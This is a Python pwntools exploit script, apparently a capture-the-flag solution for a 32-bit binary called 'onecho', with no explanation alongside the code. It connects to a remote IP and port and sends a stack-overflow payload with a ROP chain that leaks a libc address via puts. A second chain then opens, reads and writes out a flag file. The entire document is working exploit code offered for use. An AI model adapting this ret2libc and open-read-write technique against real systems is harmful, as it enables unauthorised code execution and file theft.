#encoding:utf-8
from pwn import *
#context.log_level = 'debug'

#p = process("./onecho", env={"LD_PRELOAD":"./libc.so.6"})
p = remote("182.116.62.85",24143)
elf = ELF("./onecho")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
libc = ELF("./libc.so.6")


#gdb.attach(p,"b *0x080495FC")
#raw_input()

payload = '\x00'+'a'*(0x10c-1)
payload += 'b'*0x4
payload += p32(0x08049022)+p32(0x0804C100)
payload += p32(elf.plt['puts'])+p32(0x08049022)+p32(elf.got['puts'])
payload += p32(elf.plt['read'])+p32(0x08049811)+p32(0)+p32(0x0804C350)+p32(0x100)
payload += p32(0x0804973F)
p.sendline(payload)
sleep(0.2)
p.send("./flag\x00\x00")

p.recvuntil("name:\n")
leak_addr = u32(p.recv(4))
print "leak_addr:",hex(leak_addr)
libc_base = leak_addr - libc.sym['puts']
print "libc_base:",hex(libc_base)
print hex(libc_base+libc.sym['open'])

payload = '\x00'+'b'*(0x10c-1)
payload += 'c'*0x4
payload += p32(0x08049022)+p32(0x0804C600)
payload += p32(0x08049022)+p32(0x0)
payload += p32(libc_base+libc.sym['open'])+p32(0x08049812)+p32(0x0804C350)+p32(0)
payload += p32(elf.plt['read'])+p32(0x08049811)+p32(3)+p32(0x0804C600)+p32(0x100)
payload += p32(elf.plt['write'])+p32(0x08049811)+p32(1)+p32(0x0804C600)+p32(0x3000)
payload += p32(0x0804973F)

p.sendline(payload)

#p.sendline(('a'*0x38+p32(0xffffcff8)).ljust(0x108,'a')+p32(0x0804bfa8)+p32(0xffffcfe8)+p32(0x080496b7)+p32(0xffffcfb0)+'\x4d')


#0xffffcf98 —▸ 0xffffcfe8 —▸ 0xffffcff8 ◂— 0x0


p.interactive()
